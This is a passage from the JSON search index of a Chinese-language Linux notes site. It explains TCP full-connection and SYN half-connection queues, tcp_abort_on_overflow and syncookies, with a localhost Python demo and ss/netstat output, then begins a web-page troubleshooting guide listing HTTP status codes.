listen(int sockfd,int backlog)\u51fd\u6570\u4e2d\u7684\u53c2\u6570backlog\uff0cTomcat \u9ed8\u8ba4100\uff0cNginx \u9ed8\u8ba4511. \u534a\u8fde\u63a5\u961f\u5217\u7684\u5927\u5c0f\u53ea\u80fd\u901a\u8fc7 /proc/sys/net/ipv4/tcp_max_syn_backlog\u6765\u8bbe\u7f6e /proc/sys/net/ipv4/tcp_abort_on_overflow \u5168\u8fde\u63a5\u961f\u5217\u5df2\u6ee1\u5c31\u4f1a\u6839\u636etcp_abort_on_overflow\u7b56\u7565\u8fdb\u884c\u5904\u7406\u3002 \u5f53tcp_abort_on_overflow=0\uff0c\u5168\u8fde\u63a5\u961f\u5217\u6ee1\u4e86\uff0c\u5ba2\u6237\u7aef\u53d1\u6765ACK\uff0c\u670d\u52a1\u7aef\u76f4\u63a5\u4e22\u5f03\u8be5ACK\uff0c\u6b64\u65f6\u670d\u52a1\u7aef\u5904\u4e8e\u3010SYN-RECV\u3011\u7684\u72b6\u6001\uff0c\u5ba2\u6237\u7aef\u5904\u4e8e\u3010ESTABLISHED\u3011\u7684\u72b6\u6001\u3002\u5728\u8be5\u72b6\u6001\u4e0b\u4f1a\u6709\u4e00\u4e2a\u5b9a\u65f6\u5668\u91cd\u4f20\u670d\u52a1\u7aef SYN/ACK \u7ed9\u5ba2\u6237\u7aef\uff08\u4e0d\u8d85\u8fc7 /proc/sys/net/ipv4/tcp_synack_retries \u6307\u5b9a\u7684\u6b21\u6570\uff0cLinux\u4e0b\u9ed8\u8ba45\uff0c\u76ee\u7684\u4e3a\u4e86\u8ba9\u5ba2\u6237\u7aef\u91cd\u53d1ACK\uff0c\u5f53\u5168\u8fde\u63a5\u961f\u5217\u6709\u7a7a\u4f59\u4e86\uff0c\u8fd9\u6837\u8fde\u63a5\u8fd8\u4f1a\u91cd\u65b0\u5efa\u7acb\u8d77\u6765\uff09\u3002\u8d85\u8fc7\u540e\uff0c\u670d\u52a1\u5668\u4e0d\u5728\u91cd\u4f20\uff0c\u540e\u7eed\u4e5f\u4e0d\u4f1a\u6709\u4efb\u4f55\u52a8\u4f5c\u3002\u5982\u679c\u6b64\u65f6\u5ba2\u6237\u7aef\u53d1\u9001\u6570\u636e\u8fc7\u6765\uff0c\u670d\u52a1\u7aef\u4f1a\u8fd4\u56deRST\u3002\uff08\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u5f02\u5e38\u539f\u56e0\u4e86\uff09 \u5f53tcp_abort_on_overflow=1\uff0c\u5168\u8fde\u63a5\u961f\u5217\u6ee1\u4e86\uff0c\u5ba2\u6237\u7aef\u53d1\u6765ACK\uff0c\u670d\u52a1\u7aef\u76f4\u63a5\u8fd4\u56deRST\u901a\u77e5\u5ba2\u6237\u7aef\uff0c\u8868\u793a\u5e9f\u6389\u8fd9\u4e2a\u63e1\u624b\u8fc7\u7a0b\u548c\u8fd9\u4e2a\u8fde\u63a5\uff0c\u5ba2\u6237\u7aef\u4f1a\u62a5connection reset by peer\u3002 /proc/sys/net/ipv4/tcp_syncookies \u5982\u679c SYN \u534a\u8fde\u63a5\u961f\u5217\u5df2\u6ee1\uff0c\u6b63\u5e38\u9ed8\u8ba4\u53ea\u80fd\u4e22\u5f03\u540e\u7eed\u5ba2\u6237\u7aef\u53d1\u6765\u7684SYN\u5305\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u53c2\u6570\uff0c\u7ed5\u8fc7\u534a\u8fde\u63a5\u961f\u5217\u3002 \u5f00\u542f syncookies \u529f\u80fd\u5c31\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528 SYN \u534a\u8fde\u63a5\u961f\u5217\u7684\u60c5\u51b5\u4e0b\u6210\u529f\u5efa\u7acb\u8fde\u63a5 \uff0c\u5f53\u5f00\u542f\u4e86 syncookies \u529f\u80fd\u5c31\u4e0d\u4f1a\u4e22\u5f03\u8fde\u63a5\u3002 syncookies \u662f\u8fd9\u4e48\u505a\u7684\uff1a\u670d\u52a1\u5668\u6839\u636e\u5f53\u524d\u72b6\u6001\u8ba1\u7b97\u51fa\u4e00\u4e2a\u503c\uff0c\u653e\u5728\u5df1\u65b9\u53d1\u51fa\u7684 SYN+ACK \u62a5\u6587\u4e2d\u53d1\u51fa\uff0c\u5f53\u5ba2\u6237\u7aef\u8fd4\u56de ACK \u62a5\u6587\u65f6\uff0c\u53d6\u51fa\u8be5\u503c\u9a8c\u8bc1\uff0c\u5982\u679c\u5408\u6cd5\uff0c\u5c31\u8ba4\u4e3a\u8fde\u63a5\u5efa\u7acb\u6210\u529f\uff0c\u5982\u4e0a\u56fe\u6240\u793a tcp_syncookies \u53c2\u6570\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u4e2a\u503c\uff1a 0 \u503c\uff0c\u8868\u793a\u5173\u95ed\u8be5\u529f\u80fd\uff1b 1 \u503c\uff0c\u8868\u793a\u4ec5\u5f53 SYN \u534a\u8fde\u63a5\u961f\u5217\u653e\u4e0d\u4e0b\u65f6\uff0c\u518d\u542f\u7528\u5b83\uff1b 2 \u503c\uff0c\u8868\u793a\u65e0\u6761\u4ef6\u5f00\u542f\u529f\u80fd\uff1b tcp_syncookies = 1 \u65f6\uff0c\u534a\u8fde\u63a5\u961f\u5217\u6ee1\u540e\uff0c\u540e\u7eed\u7684\u8bf7\u6c42\u5c31\u4e0d\u4f1a\u5b58\u653e\u5230\u534a\u8fde\u63a5\u961f\u5217\u4e86\uff0c\u800c\u662f\u5728\u7b2c\u4e8c\u6b21\u63e1\u624b\u7684\u65f6\u5019\uff0c\u670d\u52a1\u7aef\u4f1a\u8ba1\u7b97\u4e00\u4e2a cookie \u503c\uff0c\u653e\u5165\u5230 SYN +ACK \u5305\u4e2d\u7684\u5e8f\u5217\u53f7\u53d1\u7ed9\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u540e\u5e76\u56de ack \uff0c\u670d\u52a1\u7aef\u5c31\u4f1a\u6821\u9a8c\u8fde\u63a5\u662f\u5426\u5408\u6cd5\uff0c\u5408\u6cd5\u5c31\u76f4\u63a5\u628a\u8fde\u63a5\u653e\u5165\u5230\u5168\u8fde\u63a5\u961f\u5217\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_4","text":"","title":"\u547d\u4ee4\u5b66\u4e60"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_5","text":"\u67e5\u770b\u5f53\u524dsocket\u5168\u8fde\u63a5\u5927\u5c0f\uff1a netstat -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684 Recv-Q \u6216\u8005 ss -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684 Recv-Q \u67e5\u770b\u5f53\u524dsocket\u6700\u5927\u5168\u8fde\u63a5\u5927\u5c0f\uff1a netstat -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684Send-Q \u6216\u8005 ss -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684 Send-Q ss \u548c netstat \uff0c\u901a\u8fc7\u8fd9\u4e24\u4e2a\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u5168\u961f\u5217\u5927\u5c0f\u3002 \u7f51\u4e0a\u8bf4\uff08 ss -tan \u7ed3\u679c\u548c netstat -tan \u7684\u7ed3\u679c\u4e2d\u7684 Recv-Q Send-Q \u5bb9\u6613\u6df7\u6dc6\uff09\uff0c\u90a3\u662f\u56e0\u4e3anetstat\u7684\u8001\u7248\u672c\u7684man\u89e3\u91ca\u548c\u65b0\u7248\u672cman\u89e3\u91ca\u4e0d\u540c\uff0c\u622a\u56fe\u5982\u4e0b\u3002\u5728\u65b0\u7248\u672c\u4e2d\u8fd9\u4e2a\u91ca\u4e49\u548c ss \u547d\u4ee4\u7684\u91ca\u4e49\u662f\u76f8\u540c\u7684\u3002\u6240\u4ee5\u4e0d\u5b58\u5728\u6df7\u6dc6\uff0c\u5c31\u662f\u4e00\u6837\u7684 \u65b0\u7248\u672c\uff1a \u8001\u7248\u672c\uff1a \uff08\u5410\u69fd\u4e00\u4e0b\uff0cnetstat man\u624b\u518c\u8001\u7248\u672c\u4e3a2000\u5e74\u7248\u672c\uff0c\u65b0\u7248\u672c\u4e3a2014\u3002\u81f3\u5c11netstat\u5728\u547d\u4ee4\u4e2d\u8fd8\u89e3\u91ca\u4e86\u4e00\u4e0bRecv-Q\u548cSend-Q\uff0c\u800css\u7684man\u624b\u518c\u4e2d\u4ec0\u4e48\u90fd\u6ca1\u5199\uff0c\u4e0d\u77e5\u9053\u7f51\u53cb\u90fd\u4ece\u54ea\u91cc\u627e\u7684\u8d44\u6599\uff0c\u7f51\u4e0a\u968f\u4fbf\u4e00\u641c\uff0c\u7f51\u6587\u8bf4\u7684\u57fa\u672c\u5c31\u662f\u548c\u65b0\u7248\u672cnetstat\u91ca\u4e49\u4e00\u6837\uff09 \u8d34\u4e00\u4e0b\u6700\u65b0\u7684netstat\u548css\u7684\u5728\u7ebfman\u624b\u518c\uff1a ss(8) - Linux manual page (man7.org) netstat(8) - Linux manual page (man7.org) \u56fd\u8bed\u7248\u672c\u7684\uff1a netstat \u56fd\u8bed\u7ffb\u8bd1\u7684\u5c31\u662f\u8001\u7248\u672c\u7684 \u65b0\u6807\u7b7e\u9875 (debian.org) ss \u547d\u4ee4\u6ca1\u627e\u5230\u56fd\u8bed\u7684\uff0c\u8d34\u4e00\u4e2a\u89e3\u91ca\u6bd4\u8f83\u5168\u7684\uff1a ss \u547d\u4ee4\uff0cLinux ss \u547d\u4ee4\u8be6\u89e3\uff1a\u6bd4 netstat \u597d\u7528\u7684socket\u7edf\u8ba1\u4fe1\u606f\uff0ciproute2 \u5305\u9644\u5e26\u7684\u53e6\u4e00\u4e2a\u5de5\u5177\uff0c\u5141\u8bb8\u4f60\u67e5\u8be2 socket \u7684\u6709\u5173\u7edf\u8ba1\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) ss \u548c netstat \u547d\u4ee4\u83b7\u53d6\u7684 Recv-Q/Send-Q \u5728\u300cLISTEN \u72b6\u6001\u300d\u548c\u300cESTABLISHED \u72b6\u6001\uff08\u540cCLOSE_WAIT\uff0cFIN_WAIT1\uff0cFIN_WAIT2\uff0cTIME_WAIT\u3002\u8fd9\u91cc\u81ea\u5df1\u505a\u8fc7\u5b9e\u9a8c\uff0c\u786e\u5b9e\u662f\u76f8\u540c\u7684\uff0c\u53ef\u80fd\u8fd9\u4e9b\u72b6\u6001\u662fESTABLISHED\u4e4b\u540e\u7684\u72b6\u6001\uff0c\u6240\u4ee5\u4e5f\u8ba4\u4e3a\u662fESTABLISHED\u72b6\u6001\uff09\u300d\u6240\u8868\u8fbe\u7684\u542b\u4e49\u662f\u4e0d\u540c\u7684 \u5728\u300cLISTEN \u72b6\u6001\u300d\u65f6 Recv-Q\uff1a\u5f53\u524d\u5168\u8fde\u63a5\u961f\u5217\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u5df2\u5b8c\u6210\u4e09\u6b21\u63e1\u624b\u5e76\u7b49\u5f85\u670d\u52a1\u7aef accept() \u7684 TCP \u8fde\u63a5\uff1b Send-Q\uff1a\u5f53\u524d socket \u5168\u8fde\u63a5\u6700\u5927\u961f\u5217\u957f\u5ea6\u3002 \u5728\u300cESTABLISHED \u72b6\u6001\uff08\u540cCLOSE_WAIT\uff0cFIN_WAIT1\uff0cFIN_WAIT2\uff0cTIME_WAIT\uff09\u300d\u65f6 Recv-Q\uff1a\u5df2\u6536\u5230\u4f46\u672a\u88ab\u5e94\u7528\u8fdb\u7a0b\u8bfb\u53d6\u7684\u5b57\u8282\u6570\uff1b Send-Q\uff1a\u5df2\u53d1\u9001\u4f46\u672a\u6536\u5230\u786e\u8ba4\u7684\u5b57\u8282\u6570\uff1b","title":"\u67e5\u770b\u5168\u8fde\u63a5\u72b6\u6001\uff1a"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_6","text":"\u5f53\u524d\u534a\u8fde\u63a5\u591a\u5c11\uff1a ss -tan | grep SYN_RECV | wc -l \u67e5\u770b\u534a\u8fde\u63a5\u961f\u5217\u6700\u5927\u957f\u5ea6\uff1a cat /proc/sys/net/ipv4/tcp_max_syn_backlog \u5f53\u524d\u7cfb\u7edf\u53c2\u6570\uff1a [root@VM-0-16-centos pycharm]# cat /proc/sys/net/ipv4/tcp_syncookies #\u534a\u8fde\u63a5\u653e\u4e0d\u4e0b\u662f\uff0c\u542f\u7528cookies\u6765\u5efa\u7acb\u8fde\u63a5 1 [root@VM-0-16-centos pycharm]# cat /proc/sys/net/ipv4/tcp_abort_on_overflow #\u5168\u8fde\u63a5\u6ee1\u4e86\u540e\uff0c\u670d\u52a1\u7aef\u4e22\u5f03\u5ba2\u6237\u7aef\u53d1\u6765\u7684ACK\u5305 0 [root@VM-0-16-centos pycharm]# cat /proc/sys/net/ipv4/tcp_max_syn_backlog #\u534a\u8fde\u63a5\u5927\u5c0f 256 [root@VM-0-16-centos pycharm]# cat /proc/sys/net/core/somaxconn #\u5168\u8fde\u63a5\u5927\u5c0f 128 \u4e3a\u4e86\u66f4\u52a0\u6df1\u523b\u7684\u4f53\u4f1a\u4e00\u4e0b\uff0c\u6211\u5199\u6bb5Python\u4ee3\u7801\u6a21\u62df\u4e00\u4e0b\u5168\u8fde\u63a5\u5806\u79ef\u7684\u60c5\u51b5\u3002 \u670d\u52a1\u7aef\u4ee3\u7801\uff1a import socket import time socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # \u521b\u5efasocket\u5bf9\u8c61 socket.bind(('127.0.0.1', 4323)) # \u7ed1\u5b9a\u5730\u5740 socket.listen(5) # \u5168\u8fde\u63a5\u961f\u5217\u8bbe\u7f6e\u4e3a5 time.sleep(1000) # \u6a21\u62df \u8ba9\u670d\u52a1\u7aef\u5728accept()\u4e4b\u524dhung\u4f4f conn, addr = socket.accept() # \u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5 print('\u6b22\u8fceaddr{}'.format(addr)) # \u6253\u5370\u8bbf\u95ee\u7684\u7528\u6237\u4fe1\u606f print('\u6b22\u8fceconn{}'.format(conn)) data = conn.recv(1024) dt = data.decode('utf-8') # \u63a5\u6536\u4e00\u4e2a1024\u5b57\u8282\u7684\u6570\u636e print('\u6536\u5230\uff1a', dt) \u5ba2\u6237\u7aef\u4ee3\u7801\uff1a import socket import time socket = socket.socket() # \u521b\u5efasocket\u5bf9\u8c61 socket.connect(('127.0.0.1', 4323)) # \u5efa\u7acb\u8fde\u63a5 ab = '\u5ba2\u6237\u7aef\u53d1\u51fa' socket.send(ab.encode('utf-8')) # \u53d1\u9001\u6570\u636e time.sleep(1000) #\u4e3a\u4e86\u7ef4\u6301\u8fde\u63a5\uff0c\u8ba9\u5ba2\u6237\u7aef\u4e0d\u9000\u51fa\u3002 socket.close() \u670d\u52a1\u7aef\u542f\u52a8\uff1a LISTEN\u72b6\u6001\u7684\u8fde\u63a5Send-Q\uff0c\u53ef\u4ee5\u770b\u5230\u5168\u8fde\u63a5\u5927\u5c0f\u4e3a5 [root@VM-0-16-centos pycharm]# python3 server.py & [1] 28870 [root@VM-0-16-centos pycharm]# ss -lnp | grep 4323 tcp LISTEN 0 5 127.0.0.1:4323 *:* users:((\"python3\",pid=28870,fd=3)) [root@VM-0-16-centos pycharm]# ss -tan | grep 4323 LISTEN 0 5 127.0.0.1:4323 *:* \u5ba2\u6237\u7aef\u542f\u52a83\u6b21\uff1a [root@VM-0-16-centos pycharm]# python3 client.py & [1] 29030 [root@VM-0-16-centos pycharm]# python3 client.py & [2] 29038 [root@VM-0-16-centos pycharm]# python3 client.py & [3] 29046 \u670d\u52a1\u7aef\u663e\u793a\uff1a \u8fd9\u662f\u4ece ss -lnp \u4e0a\u5df2\u7ecf\u770b\u5230\uff0cLISTEN\u72b6\u6001\u7684\u8fde\u63a5 Recv-Q \u662f3\uff0c Send-Q \u662f5\u3002\u5f53\u524d\u5168\u8fde\u63a5\u4e2a\u6570\u4e3a3\u3002 ss -tan \u5728ESTAB\u7684\u72b6\u6001\u4e0b\uff0c\u53ef\u4ee5\u770b\u523015\uff0c\u90a3\u662f\u56e0\u4e3a\u5ba2\u6237\u7aef\u53d1\u4e865\u4e2a\u5b57\u7ed9\u670d\u52a1\u7aef\uff0c\u4e00\u4e2a\u5b57\u5360\u75283\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e3a15\u3002 [root@VM-0-16-centos pycharm]# ss -lnp | grep 4323 Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 3 5 127.0.0.1:4323 *:* users:((\"python3\",pid=28870,fd=3)) [root@VM-0-16-centos pycharm]# ss -tan | grep 4323 State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 3 5 127.0.0.1:4323 *:* ESTAB 0 0 127.0.0.1:40448 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40448 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40452 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40462 ESTAB 0 0 127.0.0.1:40462 127.0.0.1:4323 ESTAB 0 0 127.0.0.1:40452 127.0.0.1:4323 \u5ba2\u6237\u7aef\u518d\u6267\u884c7\u6b21\uff1a [root@VM-0-16-centos pycharm]# python3 client.py & [4] 29407 [root@VM-0-16-centos pycharm]# python3 client.py & [5] 29410 [root@VM-0-16-centos pycharm]# python3 client.py & [6] 29412 [root@VM-0-16-centos pycharm]# python3 client.py & [7] 29418 [root@VM-0-16-centos pycharm]# python3 client.py & [8] 29419 [root@VM-0-16-centos pycharm]# python3 client.py & [9] 29420 [root@VM-0-16-centos pycharm]# python3 client.py & [10] 29421 \u670d\u52a1\u7aef\u663e\u793a: LISTEN\u72b6\u6001\u7684\u8fde\u63a5 Recv-Q \u662f6\uff0c Send-Q \u662f5\u3002\u5f53\u524d\u5168\u8fde\u63a5\u4e2a\u6570\u4e3a6\u3002 \u5f53\u5168\u8fde\u63a5\u6ee1\u4e86\uff0c\u540e\u7eed\u5ba2\u6237\u7aef\u53d1\u9001\u7684ACK\u5305\u5c31\u4e22\u4e86\uff0c\u6240\u4ee5\u4f1a\u51fa\u73b0\u56db\u4e2aSYN-RECV\u72b6\u6001\u7684\u8fde\u63a5\u3002 \u89e3\u91ca\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u662f\u56db\u4e2a\uff0c\u56e0\u4e3atcp_abort_on_overflow\u53c2\u6570\uff0c\u5f53\u5f53\u524d\u5168\u8fde\u63a5\u5927\u5c0f>\u8bbe\u7f6e\u7684\u5168\u8fde\u63a5\u5927\u5c0f\u65f6\uff0c\u540e\u7eed\u7684\u5ba2\u6237\u7aef\u7684ACK\u5305\u624d\u4f1a\u4e22\u5f03\uff0c5=5\u65f6\u4e0d\u89e6\u53d1\uff0c6>5\u65f6\u624d\u89e6\u53d1\u3002 SYN-RECV\u72b6\u6001\u7684\u8fde\u63a5\u4f1a\u8fdb\u5165\u534a\u8fde\u63a5\u961f\u5217\u3002\u534a\u8fde\u63a5\u72b6\u6001\u4e5f\u4f1a\u6ee1\u7684\u65f6\u5019\u3002\u6240\u4ee5\u7cfb\u7edf\u4e0a\u7684SYN-RECV\u4e0d\u80fd\u592a\u591a\u3002 ss -tan \u5728ESTAB\u7684\u72b6\u6001\u4e0b\uff0cRecv-Q\u53ef\u4ee5\u770b\u523015\uff0c\u90a3\u662f\u56e0\u4e3a\u5ba2\u6237\u7aef\u53d1\u4e865\u4e2a\u5b57\u7ed9\u670d\u52a1\u7aef\uff0c\u4e00\u4e2a\u5b57\u5360\u75283\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e3a15\u3002 \u5728ESTAB\u7684\u72b6\u6001\u4e0b\uff0cSend-Q\u53ef\u4ee5\u770b\u523015\uff0c\u90a3\u662f\u56e0\u4e3a\u6709\u56db\u4e2a\u670d\u52a1\u7aef\u8fde\u63a5\u72b6\u6001\u4e3aSYN-RECV\uff0c\u800c\u5ba2\u6237\u7aef\u4e3aESTAB\uff0c\u4ee3\u8868\u5ba2\u6237\u7aef\u5df2\u7ecf\u7ed9\u670d\u52a1\u7aef\u53d1\u9001\u4e865\u4e2a\u5b57\uff0c\u4f46\u662f\u670d\u52a1\u7aef\u8fd8\u6ca1\u6709\u63a5\u6536\u3002\u8bc1\u660e\u5728netstat\u4e2d\u5bf9ESTAB\u4e2d\u63a5\u6536\u7684\u610f\u601d\u548csocket.accept() \u4e0d\u662f\u4e00\u4e2a\u542b\u4e49\u3002 [root@VM-0-16-centos pycharm]# ss -tan | grep 4323 State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 6 5 127.0.0.1:4323 *:* SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40626 SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40628 SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40632 SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40630 ESTAB 0 0 127.0.0.1:40620 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40620 ESTAB 0 0 127.0.0.1:40622 127.0.0.1:4323 ESTAB 0 15 127.0.0.1:40628 127.0.0.1:4323 ESTAB 0 0 127.0.0.1:40448 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40448 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40622 ESTAB 0 15 127.0.0.1:40632 127.0.0.1:4323 ESTAB 0 15 127.0.0.1:40626 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40452 ESTAB 0 0 127.0.0.1:40618 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40618 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40462 ESTAB 0 0 127.0.0.1:40462 127.0.0.1:4323 ESTAB 0 0 127.0.0.1:40452 127.0.0.1:4323 ESTAB 0 15 127.0.0.1:40630 127.0.0.1:4323 [root@VM-0-16-centos pycharm]# ss -lnp | grep 4323 Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 6 5 127.0.0.1:4323 *:* users:((\"python3\",pid=28870,fd=3))","title":"\u67e5\u770b\u534a\u8fde\u63a5\u72b6\u6001\uff1a"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_7","text":"\u540e\u9762\u6211\u4f1a\u6a21\u62df\u4e0b\u5176\u4ed6\u60c5\u51b5\u3002\u3002\u3002 \u76f8\u5173\u6587\u7ae0\u63a8\u8350\uff1a \u5185\u5bb9\u8ddf\u6211\u6587\u7ae0\u8bb2\u76f8\u9a73\u65f6\uff0c\u4ee5\u6211\u7684\u4e3a\u51c6 \u65b0\u6807\u7b7e\u9875 (cnblogs.com)","title":"\u672a\u5b8c\u5f85\u7eed\u3002\u3002\u3002"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/","text":"\u6392\u67e5\u7f51\u9875\u6253\u4e0d\u5f00\u95ee\u9898 \u7b2c\u4e00\u6b65 1,\u901a\u8fc7\u7ec8\u7aefping\u7f51\u9875\u57df\u540d\uff0c\u662f\u5426\u80fd\u901a\uff0c\u5982\u679c\u4e0d\u901a\uff0c\u68c0\u67e5\u57df\u540d\u5730\u5740\u662f\u5426\u6b63\u786e\uff0c\u5426\u5219\u68c0\u67e5DNS \u7b2c\u4e8c\u6b65 2,\u6d4f\u89c8\u5668\u6253\u5f00\u5f00\u53d1\u8005\u6a21\u5f0f\uff0c\u67e5\u770b\u7f51\u9875\u8fd4\u56de\u7684http\u72b6\u6001\u7801\uff0c\u6839\u636e\u4e0d\u540c\u7684HTTP\u72b6\u6001\u8fdb\u884c\u6392\u67e5 HTTP\u72b6\u6001\u7801\u662f\u670d\u52a1\u5668\u7528\u6765\u54cd\u5e94\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6807\u51c6\u6570\u5b57\u4ee3\u7801\u3002 \u4e0d\u540c\u7684\u72b6\u6001\u7801\u8868\u793a\u4e0d\u540c\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u5927\u81f4\u5206\u4e3a\u4e94\u4e2a\u7c7b\u522b\uff1a 1xx - \u4fe1\u606f\u6027\u72b6\u6001\u7801 (Informational) \uff1a\u8868\u793a\u63a5\u6536\u7684\u8bf7\u6c42\u6b63\u5728\u5904\u7406\u3002 \u8fd9\u7c7b\u72b6\u6001\u7801\u901a\u5e38\u662f\u6b63\u5e38\u7684\uff0c\u4e0d\u9700\u8981\u7279\u522b\u7684\u6392\u67e5\u3002 100 Continue (\u7ee7\u7eed) 101 Switching Protocols (\u5207\u6362\u534f\u8bae) 2xx - \u6210\u529f\u72b6\u6001\u7801 (Successful) \uff1a\u8868\u793a\u8bf7\u6c42\u5df2\u6210\u529f\u88ab\u670d\u52a1\u5668\u63a5\u6536\u3001\u7406\u89e3\u3001\u5e76\u63a5\u53d7\u3002 \u6210\u529f\u72b6\u6001\u7801\u901a\u5e38\u610f\u5473\u7740\u8bf7\u6c42\u5df2\u6210\u529f\u5904\u7406\u3002\u4e0d\u9700\u8981\u7279\u522b\u6392\u67e5\u3002 200 OK (\u6210\u529f) 201 Created (\u5df2\u521b\u5efa) 202 Accepted (\u5df2\u63a5\u53d7) 204 No Content (\u65e0\u5185\u5bb9) 3xx - \u91cd\u5b9a\u5411\u72b6\u6001\u7801 (Redirection) \uff1a\u8868\u793a\u9700\u8981\u8fdb\u4e00\u6b65\u64cd\u4f5c\u4ee5\u5b8c\u6210\u8bf7\u6c42\u3002 301 Moved Permanently (\u6c38\u4e45\u79fb\u52a8) \u68c0\u67e5\u670d\u52a1\u5668\u7aef\u7684\u91cd\u5b9a\u5411\u8bbe\u7f6e\u3002\u5982\u679c\u662f\u610f\u6599\u4e4b\u5916\u7684\u91cd\u5b9a\u5411\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u914d\u7f6e\u6216\u4ee3\u7801\u4e2d\u7684\u91cd\u5b9a\u5411\u903b\u8f91\u3002 302 Found (\u627e\u5230) \u68c0\u67e5\u670d\u52a1\u5668\u7aef\u7684\u91cd\u5b9a\u5411\u8bbe\u7f6e\u3002\u5982\u679c\u662f\u610f\u6599\u4e4b\u5916\u7684\u91cd\u5b9a\u5411\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u914d\u7f6e\u6216\u4ee3\u7801\u4e2d\u7684\u91cd\u5b9a\u5411\u903b\u8f91\u3002 303 See Other (\u67e5\u770b\u5176\u4ed6\u4f4d\u7f6e) 304 Not Modified (\u672a\u4fee\u6539) \u8fd9\u901a\u5e38\u662f\u6b63\u5e38\u7684\uff0c\u8868\u793a\u8d44\u6e90\u81ea\u4e0a\u6b21\u8bf7\u6c42\u4ee5\u6765\u672a\u4fee\u6539\u3002\u68c0\u67e5\u7f13\u5b58\u8bbe\u7f6e\u3002 307 Temporary Redirect (\u4e34\u65f6\u91cd\u5b9a\u5411) 308 Permanent Redirect (\u6c38\u4e45\u91cd\u5b9a\u5411) 4xx - \u5ba2\u6237\u7aef\u9519\u8bef\u72b6\u6001\u7801 (Client Error) \uff1a\u8868\u793a\u8bf7\u6c42\u5305\u542b\u8bed\u6cd5\u9519\u8bef\u6216\u65e0\u6cd5\u5b8c\u6210\u3002 400 Bad Request (\u9519\u8bef\u8bf7\u6c42) \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6b63\u786e\u3002\u901a\u5e38\u662f\u8bf7\u6c42\u683c\u5f0f\u9519\u8bef\u3002 401 Unauthorized (\u672a\u6388\u6743) \u68c0\u67e5\u8ba4\u8bc1\u4fe1\u606f\u662f\u5426\u6b63\u786e\u3002 403 Forbidden (\u7981\u6b62) \u786e\u8ba4\u670d\u52a1\u5668\u7aef\u6743\u9650\u8bbe\u7f6e\u3002 404 Not Found (\u672a\u627e\u5230) \u68c0\u67e5\u8bf7\u6c42\u7684\u8d44\u6e90\u662f\u5426\u5b58\u5728\u3002 405 Method Not Allowed (\u65b9\u6cd5\u4e0d\u5141\u8bb8) \u786e\u8ba4\u662f\u5426\u4f7f\u7528\u4e86\u670d\u52a1\u5668\u4e0d\u652f\u6301\u7684HTTP\u65b9\u6cd5\u3002 408 Request Timeout (\u8bf7\u6c42\u8d85\u65f6) \u68c0\u67e5\u7f51\u7edc\u95ee\u9898\u6216\u670d\u52a1\u5668\u6027\u80fd\u95ee\u9898\u3002 429 Too Many Requests (\u8bf7\u6c42\u8fc7\u591a) 